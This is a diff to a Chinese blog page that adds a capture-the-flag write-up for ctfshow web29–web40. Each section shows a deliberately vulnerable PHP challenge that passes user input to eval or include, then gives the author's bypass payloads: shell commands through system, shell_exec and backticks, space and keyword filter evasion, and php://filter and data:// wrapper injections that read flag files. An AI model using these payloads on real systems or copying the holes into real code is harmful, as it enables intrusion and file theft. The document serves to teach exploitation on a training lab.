@@ -450,6 +450,225 @@ echo mt_rand()+mt_rand();</code></pre><p>返回1833303829 1800730406</p>
 <p>访问之后url是这样的/0/1/2.txt，然后手动尝试访问/0/1.txt之后url被重定向到/0/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/0/1/2.txt</p>
 <p>刚开始我想的是爆破0和1的各种组合目录，最后啥也爆破不出来，看师傅们的wp才知道是爆破/0-100/0-100/</p>
 <p>爆破/0-100/0-100/就行</p>
+<h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><pre><code>&lt;?php 
+
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 00:26:48 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+
+*/ 
+
+error_reporting(0); 
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/flag/i&quot;, $c)){ 
+    eval($c); 
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+}</code></pre><p>过滤了flag，直接cat *.php</p>
+<p><code>?c=system(‘cat *.php’);</code></p>
+<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><pre><code>&lt;?php 
+
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 00:42:26 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+
+*/ 
+
+error_reporting(0); 
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/flag|system|php/i&quot;, $c)){ 
+    eval($c); 
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+}</code></pre><p>这次过滤了system，用<code>?c=echo shell_exec(&#39;cat fl``ag.p``hp&#39;);</code></p>
+<p>这里我刚开始用<code>?c=echo exec(&#39;ls&#39;);</code>发现只有index.php，并且<code>?c=echo exec(&#39;cat fl``ag.p``hp&#39;);</code>之后也只有$flag = ‘flag{28bba894-7025-47a3-a269-e98f60f6bfce}’;</p>
+<p>问过羽大佬之后才知道是exec和shell_exec的区别，exec只返回结果的最后一行，而shell_exec返回完整结果。</p>
+<p>参考<a href="http://www.manongjc.com/article/1992.html" target="_blank" rel="noopener">http://www.manongjc.com/article/1992.html</a></p>
+<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre><code>&lt;?php 
+
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 00:49:10 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+
+*/ 
+
+error_reporting(0); 
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&quot;, $c)){ 
+    eval($c); 
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+}</code></pre><p>过滤了空格和单引号，cat也不能用，用%09代替空格绕过</p>
+<pre><code>?c=echo(`nl%09*`);</code></pre><p>还有几个代替空格的，但是这里没用：${IFS}、$IFS$9、&lt;&gt;、&lt;</p>
+<h3 id="web32-36"><a href="#web32-36" class="headerlink" title="web32-36"></a>web32-36</h3><pre><code>&lt;?php 
+
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 00:56:31 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+
+*/ 
+
+error_reporting(0); 
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&quot;, $c)){ 
+    eval($c); 
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+}</code></pre><p>这次直接连echo都直接过滤了，包括括号也过滤了，php中不用括号的函数有echo、print、die、include、require、include_once、require_once,用include函数和post传伪协议构成payload</p>
+<p>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<p>后面的33-37基本都差不多，同一个payload</p>
+<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><pre><code>&lt;?php 
+
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 05:18:55 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+*/ 
+
+//flag in flag.php 
+error_reporting(0); 
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/flag/i&quot;, $c)){ 
+    include($c); 
+    echo $flag; 
+
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+}</code></pre><p>过滤了flag，然后包含出来，用data协议</p>
+<pre><code>?c=data://text/plain,&lt;?php system(&#39;cat f*&#39;);?&gt;</code></pre><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><pre><code>&lt;?php 
+
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 05:23:36 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+*/ 
+
+//flag in flag.php 
+error_reporting(0); 
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/flag|php|file/i&quot;, $c)){ 
+    include($c); 
+    echo $flag; 
+
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+}</code></pre><p>  } </p>
+<p>}else{<br>  highlight_file(<strong>FILE</strong>);<br>}</p>
+<p>在37的基础上过滤了php和file，data协议用base64加密一下</p>
+<pre><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==</code></pre><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><pre><code>&lt;?php 
+
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 06:13:21 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+*/ 
+
+//flag in flag.php 
+error_reporting(0); 
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/flag/i&quot;, $c)){ 
+    include($c.&quot;.php&quot;); 
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+}</code></pre><p>在之前的基础上加了.php后缀</p>
+<pre><code>?c=data://text/plain,&lt;?php system(&#39;cat f*&#39;);?&gt;</code></pre><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><pre><code>&lt;?php 
+
+/* 
+\# -*- coding: utf-8 -*- 
+\# @Author: h1xa 
+\# @Date:  2020-09-04 00:12:34 
+\# @Last Modified by:  h1xa 
+\# @Last Modified time: 2020-09-04 06:03:36 
+\# @email: h1xa@ctfer.com 
+\# @link: https://ctfer.com 
+*/ 
+
+
+
+if(isset($_GET[&#39;c&#39;])){ 
+  $c = $_GET[&#39;c&#39;]; 
+  if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c)){ 
+    eval($c); 
+  } 
+
+}else{ 
+  highlight_file(__FILE__); 
+} 
+
+</code></pre><p>啥也看不懂，大佬的wp都看不懂，先看羽师傅的wp</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015201529.png" alt></p>
+<p>又是看不懂的东西，首先session_start()函数初始化session，然后引用session_id,构造system(ls);</p>
+<p>俺照着试了试确实能行，但是也确实不能cat flag</p>
+<p>如羽师傅所说<code>因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的。</code></p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015204033.png" alt></p>
+<p>接着看第二个解法读文件+数组改造</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015204550.png" alt></p>
+<p>又是一大堆奇奇怪怪的函数，第一个函数localeconv()：查找美国本地的数字格式化信息，返回内容为</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015205007.png" alt></p>
+<p>pos()函数：pos()函数是current()函数的别名，它可返回数组中当前元素的值。在这里它返回了</p>
+<p>localeconv()函数返回数组中的第一个元素.</p>
+<p>scandir():列出指定路径中的文件和目录，这里构造的是scandir(.)。</p>
+<p>现在的返回值是</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015211313.png" alt></p>
+<p>array_reverse():返回单元顺序相反的数组，这里的作用就是把两个php文件提到前边</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015211429.png" alt></p>
+<p>next()：将数组中的内部指针向前移动一位 ，就是把数组中第二个元素提前一位并且返回，在这里是把flag.php提到第一位并返回</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015212249.png" alt></p>
+<p>然后highlight_file()函数将flag.php中的内容返回</p>
+<p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015212854.png" alt></p>
 <h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
 <h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p>
 <p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJubCAqIik/Pg==</p>
@@ -532,7 +751,7 @@ echo mt_rand()+mt_rand();</code></pre><p>返回1833303829 1800730406</p>
     <div class="ins-search-mask"></div>
     <div class="ins-search-container">
         <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <input type="text" class="ins-search-input" placeholder="Type something..."/>
             <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="ins-section-wrapper">
@@ -544,10 +763,10 @@ echo mt_rand()+mt_rand();</code></pre><p>返回1833303829 1800730406</p>
 (function (window) {
     var INSIGHT_CONFIG = {
         TRANSLATION: {
-            POSTS: '文章',
-            // PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
+            POSTS: 'Posts',
+            // PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
         },
         ROOT_URL: '/',
         CONTENT_URL: '/content.json',
